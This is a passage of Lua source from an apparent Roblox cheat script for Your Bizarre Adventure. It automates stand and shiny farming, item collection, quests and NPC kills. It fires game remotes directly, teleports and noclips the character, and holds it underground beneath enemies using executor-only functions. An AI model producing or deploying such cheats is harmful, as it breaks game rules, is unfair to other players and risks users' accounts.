                shinyFarmRunning = true
                notify("Shiny Farm", "Shiny farming started!")
                
                local HRP = Util:GetHRP()
                
                task.spawn(function()
                    while shinyFarmRunning do
                        task.wait(0.1)
                        
                        if Util:CountItem("Mysterious Arrow") == 0 or Util:CountItem("Rokakaka") == 0 then
                            FarmItems({"Rokakaka", "Mysterious Arrow", "Lucky Arrow"})
                        end
                        
                        if Util:FindTable("ShinyToggles", Util:CheckShiny()) then
                            for _, Instance in pairs(Util:GetPlayer().PlayerGui.HUD.Main.Frames.Stands.ScrollingFrame:GetChildren()) do
                                if Instance:FindFirstChild("TextLabel") and string.find(Instance.TextLabel.Text, "None") then
                                    Util:GetCharacter().RemoteEvent:FireServer("SwapStand", tostring(Instance.Name))
                                    local charAddedConn = Util:GetPlayer().CharacterAdded:Connect(function() end)
                                    task.wait(10)
                                    if charAddedConn then charAddedConn:Disconnect() end
                                    break
                                end
                            end
                            continue
                        end
                        
                        if Util:HasStand() and Util:HasShiny() and Util:FindTable("ShinyToggles", Util:CheckShiny()) then
                            if not Util:GetState("Waiting") then
                                notify("Shiny Farm", "You have the shiny you wanted: " .. Util:CheckShiny())
                                Util:SetState("Waiting", true)
                                shinyFarmRunning = false
                                ShinyFarmSettings:Set("ShinyFarm_Enabled", false)
                                break
                            else
                                continue
                            end
                        end
                        
                        Util:SetState("Waiting", false)
                        
                        if Util:HasStand() and ((Util:HasShiny() and not Util:FindTable("ShinyToggles", Util:CheckShiny())) or not Util:HasShiny()) then
                            Util:UseRoka()
                            local roukaWaitTime = 0
                            repeat 
                                task.wait(0.1)
                                roukaWaitTime = roukaWaitTime + 0.1
                            until (Util:GetCharacter() and Util:GetCharacter():FindFirstChild("RemoteEvent")) or roukaWaitTime > 15
                            
                            if roukaWaitTime > 15 then
                                notify("Shiny Farm", "Character respawn timeout, restarting...")
                                continue
                            end
                        end
                        
                        if not Util:HasStand() and shinyFarmRunning then
                            Util:Stats()
                            task.wait(0.3)
                            Util:UseArrow()
                            local arrowWaitTime = 0
                            repeat 
                                task.wait(0.1)
                                arrowWaitTime = arrowWaitTime + 0.1
                            until Util:HasStand() or arrowWaitTime > 15
                            
                            if arrowWaitTime > 15 then
                                notify("Shiny Farm", "Stand acquire timeout, restarting...")
                                continue
                            end
                        end
                    end
                end)
            else
                shinyFarmRunning = false
                Util:DisconnectTask("SafeFarm")
                notify("Shiny Farm", "Shiny farming stopped!")
            end
        end
    })
    
    ShinyFarmSettings:Toggle({
        Flag = "RibShinyFarm_Enabled",
        Title = "Enable Rib Shiny Farm",
        Default = false,
        Callback = function(State)
            if State then
                ribShinyFarmRunning = true
                notify("Rib Shiny Farm", "Rib shiny farming started!")
                
                local HRP = Util:GetHRP()
                
                task.spawn(function()
                    while ribShinyFarmRunning do
                        task.wait()
                        if Util:CountItem("Rib Cage of The Saint's Corpse") == 0 then
                            FarmItems({"Rib Cage of The Saint's Corpse"})
                        end
                        
                        if Util:HasStand() and Util:FindTable("ShinyToggles", Util:CheckShiny()) then
                            if not Util:GetState("Waiting") then
                                notify("Rib Shiny Farm", "You have the shiny you wanted: " .. Util:CheckShiny())
                                Util:SetState("Waiting", true)
                                ribShinyFarmRunning = false
                                ShinyFarmSettings:Set("RibShinyFarm_Enabled", false)
                                break
                            else
                                continue
                            end
                        end
                        
                        Util:SetState("Waiting", false)
                        
                        if ribShinyFarmRunning then
                            Util:Stats()
                            Util:UseRib()
                            repeat task.wait() until Util:HasStand()
                        end
                    end
                end)
        else
                ribShinyFarmRunning = false
                Util:DisconnectTask("SafeFarm")
                notify("Rib Shiny Farm", "Rib shiny farming stopped!")
            end
        end
    })
    
    
    
    local shinyDropdown = ShinySelection:Dropdown({
        Flag = "ShinyDropdown",
        Title = "Select Shinies to Farm",
        Values = Util:GetTable("AllShinys"),
        Multi = true,
        Callback = function(selected)
            Util:SetTable("Shinys", selected)
        end
    })
    
    task.spawn(function()
        if workspace.Item_Spawns and workspace.Item_Spawns.Items then
            for _, v in pairs(workspace.Item_Spawns.Items:GetChildren()) do
                AddToQueue(v)
            end
            workspace.Item_Spawns.Items.ChildAdded:Connect(function(Child)
                task.wait(0.1)
                AddToQueue(Child)
            end)
        end
    end)
    
    notify("YBA Script", "Stand Farm features loaded successfully!")
end
local function LoadQuestFeatures()

    local function GetPlayer()
        return game.Players.LocalPlayer
    end

    local function GetCharacter()
        return GetPlayer().Character or GetPlayer().CharacterAdded:Wait()
    end

    local function GetHRP()
        local Character = GetCharacter()
        return Character and Character:FindFirstChild("HumanoidRootPart")
    end

    local function HasStand()
        local player = GetPlayer()
        if player and player:FindFirstChild("PlayerStats") and player.PlayerStats:FindFirstChild("Stand") then
            local standValue = player.PlayerStats.Stand.Value
            if standValue ~= "None" and standValue ~= "" and standValue ~= nil then
                return true
            end
        end
        return false
    end

    local lastStandToggle = 0
    local function ToggleStand()
        local Character = GetCharacter()
        if not Character then return false end
        local remoteFunc = Character:FindFirstChild("RemoteFunction")
        if not remoteFunc then return false end
        if tick() - lastStandToggle < 0.6 then return false end
        lastStandToggle = tick()
        pcall(function()
            remoteFunc:InvokeServer("ToggleStand", "Toggle")
        end)
        return true
    end

    local function GetStandMorph()
        local Character = GetCharacter()
        if not Character then return nil end
        local standMorph = Character:FindFirstChild("StandMorph")
        if standMorph then return standMorph end
        local living = workspace:FindFirstChild("Living")
        local player = GetPlayer()
        if not living or not player then return nil end
        local entry = living:FindFirstChild(player.Name)
        if not entry then return nil end
        return entry:FindFirstChild("StandMorph")
    end

    local function RecoverStand()
        local Character = GetCharacter()
        if not Character then return end
        if not HasStand() then return end
        local hasStandSummoned = Character:FindFirstChild("SummonedStand") and Character.SummonedStand.Value
        if hasStandSummoned then
            ToggleStand()
            task.wait(0.2)
            ToggleStand()
        else
            ToggleStand()
        end
    end

    local function EquipStand()
        local Character = GetCharacter()
        if not Character then return end
        local shouldEquip = getgenv().QuestMethod == "With Stand"
        local hasStandSummoned = Character:FindFirstChild("SummonedStand") and Character.SummonedStand.Value
        local standMorph = GetStandMorph()
        local standHRP = standMorph and standMorph:FindFirstChild("HumanoidRootPart")
        local hrp = Character:FindFirstChild("HumanoidRootPart")
        local standFar = hrp and standHRP and ((standHRP.Position - hrp.Position).Magnitude > 200)

        if shouldEquip then
            if not hasStandSummoned or not standHRP or standFar then
                if ToggleStand() then
                    task.wait(0.15)
                end
                if not Character:FindFirstChild("StandMorph") then
                    ToggleStand()
                end
            end
        elseif hasStandSummoned then
            ToggleStand()
        end
    end

local function CollectRokaArrow()    
    local blacklistedStands = {
        ["Six Pistols"] = true,
        ["Hermit Purple"] = true,
        ["Aerosmith"] = true,
        ["Beach Boy"] = true,
        ["Mr. President"] = true,
        ["White Album"] = true,
        ["Anubis"] = true,
        ["Tusk ACT 1"] = true,
        ["Tusk Act 1"] = true,
        ["Tusk act 1"] = true
    }
    
    local function LearnWorthiness()
        local Character = GetCharacter()
        if not Character or not Character:FindFirstChild("RemoteFunction") then return end
        
        local worthinessSkills = {"Worthiness", "Worthiness II", "Worthiness III", "Worthiness IV", "Worthiness V"}
        for _, skill in pairs(worthinessSkills) do
            pcall(function()
                Character.RemoteFunction:InvokeServer("LearnSkill", {
                    ["Skill"] = skill,
                    ["SkillTreeType"] = "Character"
                })
            end)
            task.wait(0.1)
        end
    end
    
    local targetItems = {"Rokakaka", "Mysterious Arrow"}
    local collected = {Rokakaka = false, ["Mysterious Arrow"] = false}
    
    local function CountItem(itemName)
        local count = 0
        local ply = GetPlayer()
        if ply and ply:FindFirstChild("Backpack") then
            for _, item in pairs(ply.Backpack:GetChildren()) do
                if item.Name == itemName then count = count + 1 end
            end
        end
        if ply and ply.Character then
            for _, item in pairs(ply.Character:GetChildren()) do
                if item.Name == itemName then count = count + 1 end
            end
        end
        return count
    end
    
    LearnWorthiness()
    task.wait(0.5)
    
    while getgenv().QuestFarmEnabled and not (collected.Rokakaka and collected["Mysterious Arrow"]) do
        local Character = GetCharacter()
        local HRP = GetHRP()
        if not Character or not HRP then task.wait(0.5) continue end
        
        if CountItem("Rokakaka") >= 1 then collected.Rokakaka = true end
        if CountItem("Mysterious Arrow") >= 1 then collected["Mysterious Arrow"] = true end
        
        if collected.Rokakaka and collected["Mysterious Arrow"] then break end
        
        local spawns = workspace:FindFirstChild("Item_Spawns") and workspace.Item_Spawns:FindFirstChild("Items")
        if spawns then
            for _, v in pairs(spawns:GetChildren()) do
                if not getgenv().QuestFarmEnabled then return false end
                
                local prox = v:FindFirstChild("ProximityPrompt")
                local part = v:FindFirstChildOfClass("MeshPart") or v:FindFirstChild("Part") or v:FindFirstChild("PrimaryPart")
                
                if prox and part and part.Transparency < 1 then
                    local itemName = prox.ObjectText
                    if table.find(targetItems, itemName) and not collected[itemName] then
                        
                        local oldCF = HRP.CFrame
                        HRP.CFrame = part.CFrame - Vector3.new(0, 3, 0)
                        task.wait(0.2)
                        
                        local noclipConn = game:GetService("RunService").Stepped:Connect(function()
                            for _, p in pairs(Character:GetDescendants()) do
                                if p:IsA("BasePart") then p.CanCollide = false end
                            end
                        end)
                        
                        for i = 1, 5 do
                            fireproximityprompt(prox, 0, true)
                            task.wait(0.1)
                        end
                        
                        noclipConn:Disconnect()
                        HRP.CFrame = oldCF
                        task.wait(0.3)
                        break
                    end
                end
            end
        end
        
        if not (collected.Rokakaka and collected["Mysterious Arrow"]) then
            task.wait(0.5)
        end
        
        task.wait(0.5)
    end
    
    if collected.Rokakaka and collected["Mysterious Arrow"] then
        
        local maxAttempts = 100
        local attempts = 0
        
        while getgenv().QuestFarmEnabled and attempts < maxAttempts do
            attempts = attempts + 1
            local player = GetPlayer()
            if not player then task.wait(0.5) continue end
            
            local Character = GetCharacter()
            if not Character then task.wait(0.5) continue end
            
            local currentStand = "None"
            if player:FindFirstChild("PlayerStats") and player.PlayerStats:FindFirstChild("Stand") then
                currentStand = player.PlayerStats.Stand.Value
            end
            
            if currentStand ~= "None" then
                task.wait(0.5)
                
                if blacklistedStands[currentStand] then
                    notify("YBA Script", "Got blacklisted stand: " .. currentStand .. " - Rokaka'ing...")
                    
                    local roka = player.Backpack:FindFirstChild("Rokakaka") or Character:FindFirstChild("Rokakaka")
                    
                    if not roka then
                        notify("YBA Script", "No Rokakaka! Collecting more...")
                        collected.Rokakaka = false
                        collected["Mysterious Arrow"] = false
                        break
                    end
                    
                    local humanoid = Character:FindFirstChildWhichIsA("Humanoid")
                    if humanoid and roka then
                        humanoid:EquipTool(roka)
                        task.wait(0.5)
                        
                        local remote = Character:FindFirstChild("RemoteEvent")
                        if remote then
                            remote:FireServer("UseItem", roka)
                        end
                        
                        for i = 1, 10 do
                            game:GetService("VirtualInputManager"):SendMouseButtonEvent(0, 8, 0, true, nil, 1)
                            task.wait(0.1)
                        end
                        
                        local dialogueWaitTime = 0
                        local dialogueGui = nil
                        while dialogueWaitTime < 3 do
                            dialogueGui = player.PlayerGui:FindFirstChild("DialogueGui")
                            if dialogueGui then break end
                            task.wait(0.1)
                            dialogueWaitTime = dialogueWaitTime + 0.1
                        end
                        
                        if dialogueGui then
                            task.wait(0.5)
                            local options = dialogueGui:FindFirstChild("Options", true)
                            if options then
                                local option1 = options:FindFirstChild("Option1")
                                if option1 then
                                    local textBtn = option1:FindFirstChild("TextButton")
                                    if textBtn then
                                        for _, conn in pairs(getconnections(textBtn.MouseButton1Click)) do
                                            conn:Fire()
                                        end
                                    end
                                end
                            end
                        end
                        
                        player.CharacterAdded:Wait()
                        task.wait(1.5)
                        
                        LearnWorthiness()
                        task.wait(0.5)
                    end
                    continue
                else
                    task.wait(1)
                    return true
                end
            end
            
            if currentStand == "None" then
                local arrow = player.Backpack:FindFirstChild("Mysterious Arrow") or Character:FindFirstChild("Mysterious Arrow")
                
                if not arrow then
                    notify("YBA Script", "No arrows! Collecting more...")
                    collected.Rokakaka = false
                    collected["Mysterious Arrow"] = false
                    break
                end
                
                local humanoid = Character:FindFirstChildWhichIsA("Humanoid")
                if humanoid and arrow then
                    humanoid:EquipTool(arrow)
                    task.wait(0.15)
                    
                    -- Immediately activate the arrow
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(0, 0, 0, true, nil, 0)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(0, 0, 0, false, nil, 0)
                    
                    -- Wait for stand to be acquired
                    local startWait = tick()
                    while tick() - startWait < 15 do
                        if player.PlayerStats.Stand.Value ~= "None" then
                            break
                        end
                        task.wait(0.2)
                    end
                    
                    player.CharacterAdded:Wait()
                    task.wait(1.5)
                    LearnWorthiness()
                    task.wait(0.3)
                end
            else
                task.wait(1.5)
            end
            
            local newStand = player.PlayerStats.Stand.Value
            if newStand ~= "None" then
                if not blacklistedStands[newStand] then
                    task.wait(0.5)
                    return true
                end
            end
            
            task.wait(0.3)
        end
        
        if attempts >= maxAttempts then
            notify("YBA Script", "Max attempts reached, stopping stand farm.")
            return false
        end
        
        if not (collected.Rokakaka and collected["Mysterious Arrow"]) then
            return false
        end
    end
    
    return false
end

    local function UseMove(Move)
        local Character = GetCharacter()
        if not Character then return end
        
        if Move:lower() == "m1" then
            if Character:FindFirstChild("RemoteEvent") then
                pcall(function()
                    Character.RemoteEvent:FireServer("HoldAttack", {Bool = true, Type = "m1"})
                    Character.RemoteEvent:FireServer("HoldAttack", {Bool = false, Type = "m1"})
                end)
            end
        elseif Move:lower() == "m2" then
            if Character:FindFirstChild("RemoteFunction") then
                pcall(function() Character.RemoteFunction:InvokeServer("Attack", Move) end)
            end
        end
    end

    local function KillEnemy(Enemy)
        if not Enemy then return end
        local enemyHRP = Enemy:FindFirstChild("HumanoidRootPart")
        local enemyHumanoid = Enemy:FindFirstChildWhichIsA("Humanoid")
        local enemyHealth = Enemy:FindFirstChild("Health")
        if not (enemyHRP and enemyHumanoid and enemyHealth) or enemyHealth.Value <= 0 then
            return
        end
        local lastHealth = enemyHealth.Value
        local lastDamageTick = tick()

        local oldPos
        local hrp = GetHRP()
        if hrp then oldPos = hrp.CFrame end
        
        local undergroundOffset = -25
        local safeLockPos = nil
        local bp = nil
        local bg = nil
        local standBp = nil
        local standBg = nil
        local RunService = game:GetService("RunService")
        local heartbeatConn = nil
        
        if enemyHRP then
            
            
            
            
            safeLockPos = enemyHRP.CFrame + Vector3.new(0, undergroundOffset, 0)
        end

        local FocusCam = nil
        local Character = GetCharacter()
        local attackConn = nil
        local function tapM1()
            local char = GetCharacter()
            local remote = char and char:FindFirstChild("RemoteEvent")
            if not remote then return end
            pcall(function()
                remote:FireServer("HoldAttack", {Bool = true, Type = "m1"})
                remote:FireServer("HoldAttack", {Bool = false, Type = "m1"})
            end)
        end
        attackConn = RunService.Heartbeat:Connect(function()
            if not (getgenv().QuestFarmEnabled or getgenv().NPCFarmEnabled) then return end
            if not Enemy or not Enemy.Parent then return end
            local healthObj = Enemy:FindFirstChild("Health")
            if not healthObj or healthObj.Value <= 0 then return end
            tapM1()
        end)

        while Enemy and Enemy.Parent and enemyHRP and enemyHumanoid and enemyHealth and enemyHealth.Value > 0 do
            Character = GetCharacter()
            if not Character then
                GetPlayer().CharacterAdded:Wait()
                Character = GetCharacter()
            end

            if not getgenv().NPCFarmEnabled and not getgenv().QuestFarmEnabled then break end
            
            
            if Character then
                local root = Character:FindFirstChild("HumanoidRootPart") or Character.PrimaryPart
                if root and root.Anchored then
                    task.wait(0.1)
                    continue
                end
                
                
                local timeStopped = false
                for _, child in pairs(game:GetService("Lighting"):GetChildren()) do
                     if child.Name:lower():find("timestop") or child.Name:lower():find("time stop") then
                         timeStopped = true
                         break
                     end
                end
                if timeStopped then
                    task.wait(0.1)
                    continue
                end
            end

            if getgenv().QuestFarmEnabled then
                local ply = GetPlayer()
                if ply and ply:FindFirstChild("PlayerStats") and ply.PlayerStats:FindFirstChild("QuestProgress") and ply.PlayerStats:FindFirstChild("QuestMaxProgress") then
                    if ply.PlayerStats.QuestProgress.Value >= ply.PlayerStats.QuestMaxProgress.Value then
                        getgenv().CompletedQuest = true
                        break
                    end
                end
            end

            enemyHRP = Enemy:FindFirstChild("HumanoidRootPart")
            enemyHumanoid = Enemy:FindFirstChildWhichIsA("Humanoid")
            enemyHealth = Enemy:FindFirstChild("Health")
            if not (enemyHRP and enemyHumanoid and enemyHealth) or enemyHealth.Value <= 0 then
                task.wait(0.215)
                break
            end
            local currentHealth = enemyHealth.Value
            if currentHealth < lastHealth then
                lastHealth = currentHealth
                lastDamageTick = tick()
            end

            if Character and Character:FindFirstChildWhichIsA("Humanoid") and Character:FindFirstChildWhichIsA("Humanoid").Health > 0 then
                local questMethod = getgenv().QuestMethod
                if questMethod == "With Stand" and not HasStand() then
                    questMethod = "Without Stand"
                end
                if questMethod == "With Stand" then
                    EquipStand()
                end

                if Character:FindFirstChild("FocusCam") == nil then
                    FocusCam = Instance.new("ObjectValue", Character)
                    FocusCam.Name = "FocusCam"
                    FocusCam.Value = enemyHRP
                else
                    local camVal = Character:FindFirstChild("FocusCam")
                    if camVal then camVal.Value = enemyHRP end
                end

                local standSummoned = Character:FindFirstChild("StandMorph") and Character.StandMorph.PrimaryPart

                if questMethod == "With Stand" then
                    enableNoclip()
                    if tick() - lastDamageTick > 1.5 then
                        undergroundOffset = -10
                    else
                        undergroundOffset = -50
                    end
                    if not safeLockPos and enemyHRP then
                         safeLockPos = enemyHRP.CFrame + Vector3.new(0, undergroundOffset, 0)
                    end
                    
                    if not heartbeatConn then
                        heartbeatConn = RunService.Heartbeat:Connect(function()
                            if not Character or not Character.Parent then return end
                            
                            
                            local currentTargetCFrame = nil
                            if enemyHRP then
                                currentTargetCFrame = enemyHRP.CFrame + Vector3.new(0, undergroundOffset, 0)
                            elseif safeLockPos then
                                currentTargetCFrame = safeLockPos
                            end

                            
                            if Character.PrimaryPart and currentTargetCFrame then
                                 if not bp or bp.Parent ~= Character.PrimaryPart then
                                     bp = Instance.new("BodyPosition")
                                     bp.Position = currentTargetCFrame.Position
                                     bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                     bp.P = 10000
                                     bp.D = 100
                                     bp.Parent = Character.PrimaryPart
                                 else
                                     bp.Position = currentTargetCFrame.Position
                                 end
                                 
                                 if not bg or bg.Parent ~= Character.PrimaryPart then
                                     bg = Instance.new("BodyGyro")
                                     bg.CFrame = currentTargetCFrame
                                     bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                                     bg.P = 10000
                                     bg.D = 100
                                     bg.Parent = Character.PrimaryPart
                                 else
                                     bg.CFrame = currentTargetCFrame
                                 end
                                 
                                 Character.PrimaryPart.CFrame = currentTargetCFrame
                                 Character.PrimaryPart.AssemblyLinearVelocity = Vector3.new(0,0,0)
                                 Character.PrimaryPart.Velocity = Vector3.new(0,0,0)
                            end
                            
                            
                            if enemyHRP and Character:FindFirstChild("StandMorph") and Character.StandMorph.PrimaryPart then
                                local standRoot = Character.StandMorph.PrimaryPart
                                local targetCFrame = enemyHRP.CFrame - enemyHRP.CFrame.LookVector * 1.1
                                
                                if not standBp or standBp.Parent ~= standRoot then
                                    standBp = Instance.new("BodyPosition")
                                    standBp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    standBp.P = 10000
                                    standBp.D = 100
                                    standBp.Parent = standRoot
                                end
                                standBp.Position = targetCFrame.Position
                                
                                if not standBg or standBg.Parent ~= standRoot then
                                    standBg = Instance.new("BodyGyro")
                                    standBg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                                    standBg.P = 10000
                                    standBg.D = 100
                                    standBg.Parent = standRoot
                                end
                                standBg.CFrame = targetCFrame
                                
                                standRoot.CFrame = targetCFrame
                                standRoot.AssemblyLinearVelocity = Vector3.new(0,0,0)
                            end
                        end)
                    end
                    
                    if standSummoned then
                         
                    end
                else
                    disableNoclip()
                    if Character.PrimaryPart then
                         pcall(function() 
                            Character.PrimaryPart.CFrame = enemyHRP.CFrame - enemyHRP.CFrame.LookVector * 2.3 
                            Character.PrimaryPart.AssemblyLinearVelocity = Vector3.new(0,0,0)
                            Character.PrimaryPart.Velocity = Vector3.new(0,0,0)
                         end)
                    end
                    
                end
            elseif Character and Character:FindFirstChildWhichIsA("Humanoid") and Character:FindFirstChildWhichIsA("Humanoid").Health <= 0 then
                GetPlayer().CharacterAdded:Wait()
            end

            task.wait()
        end

        pcall(disableNoclip)
        local hrp = GetHRP()
        if hrp then
            
            if Enemy and Enemy:FindFirstChild("HumanoidRootPart") then
                local surfacePos = Enemy.HumanoidRootPart.Position + Vector3.new(0, 5, 0)
                hrp.CFrame = CFrame.new(surfacePos)
            elseif oldPos then
                hrp.CFrame = oldPos + Vector3.new(0, 5, 0)
            end
            
            
            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            hrp.Velocity = Vector3.new(0, 0, 0)
            
            
            local oldAnchored = hrp.Anchored
            hrp.Anchored = true
            task.delay(0.5, function() 
                if hrp then hrp.Anchored = oldAnchored end 
            end)
        end
        
        task.wait(math.max(0.01, getgenv().QuestDelay or 0.1))
        
        pcall(function() 
            if attackConn then attackConn:Disconnect() attackConn = nil end
            local Character = GetCharacter()
            if Character and Character:FindFirstChild("RemoteEvent") then
                Character.RemoteEvent:FireServer("HoldAttack", {Bool = false, Type = "m1"})
            end
            if heartbeatConn then heartbeatConn:Disconnect() heartbeatConn = nil end
            if FocusCam then FocusCam:Destroy() end 
            if bp then bp:Destroy() end
            if bg then bg:Destroy() end
            if standBp then standBp:Destroy() end
            if standBg then standBg:Destroy() end
            local Character = GetCharacter()
            if Character then
                 if Character:FindFirstChild("FocusCam") then Character.FocusCam:Destroy() end
                 if Character.PrimaryPart then
                     for _, c in pairs(Character.PrimaryPart:GetChildren()) do
                         if c:IsA("BodyPosition") or c:IsA("BodyGyro") then c:Destroy() end
                     end
                 end
            end
        end)
    end

    local function GetModelCFrame(obj)
        if not obj then return nil end
        if obj:IsA("BasePart") then
            return obj.CFrame
        end
        if obj:IsA("Model") then
            local hrp = obj:FindFirstChild("HumanoidRootPart")
            if hrp and hrp:IsA("BasePart") then
                return hrp.CFrame
            end
            if obj.PrimaryPart then
                return obj.PrimaryPart.CFrame
            end
            for _, d in pairs(obj:GetDescendants()) do
                if d:IsA("BasePart") then
                    return d.CFrame
                end
            end
        end
        return nil
    end

    local function GetQuest(NPC)
        if not NPC then return false end
        local DialogueNameObj = NPC:FindFirstChild("Dialogue")
        local Character = GetCharacter()
        if DialogueNameObj and Character and Character:FindFirstChild("RemoteEvent") then
            local DialogueName = DialogueNameObj.Value
            local Event = Character:FindFirstChild("RemoteEvent")
            for i = 1, 10 do
                pcall(function()
                    Event:FireServer("EndDialogue", {
                        ["NPC"] = DialogueName,
                        ["Option"] = "Option1",
                        ["Dialogue"] = "Dialogue" .. i
                    })
                    Event:FireServer("EndDialogue", {
                        ["NPC"] = DialogueName,
                        ["Dialogue"] = "Dialogue" .. i
                    })
                end)
            end

            getgenv().CompletedQuest = false
            pcall(function() notify("YBA Script", "Quest taken: " .. NPC.Name) end)
            return true
        end
        return false
    end

    local QuestInfo = {
        ["Officer Sam [Lvl. 1+]"] = { Enemy = "Thug" },
        ["Deputy Bertrude [Lvl. 10+]"] = { Enemy = "Corrupt Police" },
        ["Abbacchio's Partner [Lvl 15+]"] = { Enemy = "Alpha Thug" },
        ["Homeless Man Jill [Lvl. 15+]"] = { Item = "Gold Coin", Amount = 10 },
        ["Dracula [Lvl. 20+]"] = { Enemy = "Zombie Henchman" },
        ["William Zeppeli [Lvl. 25+]"] = { Enemy = "Vampire" },
        ["Doppio [Lvl. 30+]"] = { Enemy = "Dio" },
        ["Dio [Lvl. 35+]"] = { Enemy = "Jotaro" },
        ["Jotaro"] = { Enemy = "Heaven Ascension Dio" },
    }

    local function ParseQuests()
        local parsed = {}
        if workspace:FindFirstChild("Dialogues") then
            for _, v in pairs(workspace.Dialogues:GetChildren()) do
                if ((v.Name:find("Lvl")) or v.Name == "Jotaro") 
                    and not v.Name:find("Darius") 
                    and not v.Name:find("Pucci") 
                    and not v.Name:find("Kars") then
                    table.insert(parsed, v.Name)
                end
            end
        end
        table.sort(parsed)
        return parsed
    end

    local ParsedQuests = ParseQuests()
    if workspace:FindFirstChild("Dialogues") then
        workspace.Dialogues.ChildAdded:Connect(function(child)
            if child 
                and ((child.Name:find("Lvl")) or child.Name == "Jotaro") 
                and not child.Name:find("Darius") 
                and not child.Name:find("Pucci") 
                and not child.Name:find("Kars") then
                table.insert(ParsedQuests, child.Name)
            end
        end)
    end

    local function GetBestQuest()
        local player = GetPlayer()
        if not player or not player:FindFirstChild("PlayerStats") or not player.PlayerStats:FindFirstChild("Level") then
            return nil
        end
        local playerLevel = player.PlayerStats.Level.Value
        local bestQuest, highestReq = nil, -1
        for _, questName in pairs(ParsedQuests) do
            local levelReq = tonumber(questName:match("(%d+)"))
            if levelReq and levelReq <= playerLevel and levelReq > highestReq then
                highestReq = levelReq
                bestQuest = questName
            end
        end
        return bestQuest
    end

    local function UpdateNPCList(npcDropdown)
        local values = {}
        local seen = {}
        local living = workspace:FindFirstChild("Living")
        if living then
            for _, child in pairs(living:GetChildren()) do
                if child:FindFirstChild("Spawn") then
                    local name = child.Name or tostring(child)
                    if not seen[name] then
                        table.insert(values, name)
                        seen[name] = true
                    end
                end
            end
        end
        table.sort(values, function(a,b) return tostring(a) < tostring(b) end)
        if #values == 0 then values = {"No spawnable NPCs found"} end

        pcall(function()
            if npcDropdown then
                if type(npcDropdown.Refresh) == "function" then
                    npcDropdown:Refresh(values, values[1])
                elseif type(npcDropdown.Update) == "function" then
                    npcDropdown:Update({ Values = values, Value = values[1] })
                elseif type(npcDropdown.SetValues) == "function" then
                    npcDropdown:SetValues(values)
                end
            end
        end)

        if values[1] and values[1] ~= "No spawnable NPCs found" then
            getgenv().TargetNPC = values[1]
        else
            getgenv().TargetNPC = ""
        end
    end

    local QuestFarmSection = QuestTab:Section({ Title = "Quest Farm" })

    local questStatus = QuestFarmSection:Section({
        Title = "Status: Working",
        TextSize = 16,
        TextTransparency = 0.3
    })

    getgenv().QuestDelay = 0.6
    QuestFarmSection:Slider({
        Flag = "QuestDelay",
        Title = "Delay (seconds) - lower = faster",
        Locked = true,
        LockedTitle = "This Feature is locked",
        Min = 0.05,
        Max = 2,
        Default = getgenv().QuestDelay,
        Increment = 0.05,
        Callback = function(v)
            getgenv().QuestDelay = tonumber(v) or 0.6
        end
    })

    if #ParsedQuests == 0 then
        table.insert(ParsedQuests, "No quests available")
    end

    QuestFarmSection:Dropdown({
        Flag = "SelectedQuest",
        Title = "Select Quest",
        Values = ParsedQuests,
        Value = ParsedQuests[1] or "No quests available",
        Callback = function(selected)
            getgenv().SelectedQuest = selected
            if selected and selected ~= "" and selected ~= "No quests available" then
                pcall(function()
                    questStatus:Update({ Title = "Status: Ready" })
                end)
            else
                pcall(function()
                    questStatus:Update({ Title = "Status: Wait" })
                end)
            end
            notify("YBA Script", "Quest set to: " .. tostring(selected))
        end
    })

QuestFarmSection:Space()

getgenv().QuestMethod = "With Stand"

QuestFarmSection:Dropdown({
    Flag = "QuestMethod",
    Title = "Method",
    Values = {"With Stand", "Without Stand"},
    Value = "With Stand",
    Callback = function(selected)
        getgenv().QuestMethod = selected
        notify("YBA Script", "Quest Method set to: " .. selected)
    end
})

    local function UpdateQuestStatus()
        pcall(function()
            if not getgenv().QuestFarmEnabled then
                questStatus:Update({ Title = "Status: Idle" })
                return
            end
            local sel = getgenv().SelectedQuest
            if not sel or sel == "" or sel == "No quests available" then
                questStatus:Update({ Title = "Status: Wait (No selection)" })
                return
            end
            if getgenv().CompletedQuest then
                questStatus:Update({ Title = "Status: Ready" })
            else
                questStatus:Update({ Title = "Status: Farming (" .. (QuestInfo[sel] and (QuestInfo[sel].Enemy or QuestInfo[sel].Item) or "Quest") .. ")" })
            end
        end)
    end


local function GetPlayerLevel()
    local player = GetPlayer()
    if player and player:FindFirstChild("PlayerStats") and player.PlayerStats:FindFirstChild("Level") then
        return player.PlayerStats.Level.Value
    end
    return 0
end

local function GetQuestLevelRequirement(questName)
    if not questName then return 0 end
    local levelReq = tonumber(questName:match("(%d+)"))
    return levelReq or 0
end

local function GetBestAvailableQuest()
    local playerLevel = GetPlayerLevel()
    local bestQuest = nil
    local highestReq = -1
    
    for _, questName in pairs(ParsedQuests) do
        if questName ~= "No quests available" then
            local levelReq = GetQuestLevelRequirement(questName)
            if levelReq and levelReq <= playerLevel and levelReq > highestReq then
                highestReq = levelReq
                bestQuest = questName
            end
        end
    end
    return bestQuest
end

local function CanTakeQuest(questName)
    local playerLevel = GetPlayerLevel()
    local questLevel = GetQuestLevelRequirement(questName)
    return playerLevel >= questLevel
end


local questFarmCharConn = nil
QuestFarmSection:Toggle({
    Flag = "QuestFarmEnabled",
    Title = "Enable Quest Farm",
    Default = false,
            Callback = function(value)
        getgenv().QuestFarmEnabled = value
        if value then
            notify("YBA Script", "Quest Farm started!")
            getgenv().CompletedQuest = true
            pcall(disableNoclip)
            if questFarmCharConn then
                pcall(function() questFarmCharConn:Disconnect() end)
                questFarmCharConn = nil
            end
            questFarmCharConn = GetPlayer().CharacterAdded:Connect(function(char)
                if not getgenv().QuestFarmEnabled then
                    return
                end
                task.wait(1)
                pcall(disableNoclip)
                getgenv().CompletedQuest = true
            end)
            
            local function GetPlayerLevel()
                local player = GetPlayer()
                if player and player:FindFirstChild("PlayerStats") and player.PlayerStats:FindFirstChild("Level") then
                    return player.PlayerStats.Level.Value
                end
                return 0
            end
            
            local playerLevel = GetPlayerLevel()
            local hasStand = HasStand()
            
            if playerLevel <= 2 and not hasStand and getgenv().QuestMethod == "With Stand" then
                notify("YBA Script", "Level " .. playerLevel .. " detected! Completing Level 1 quest WITHOUT stand first...")
                
                local originalMethod = getgenv().QuestMethod
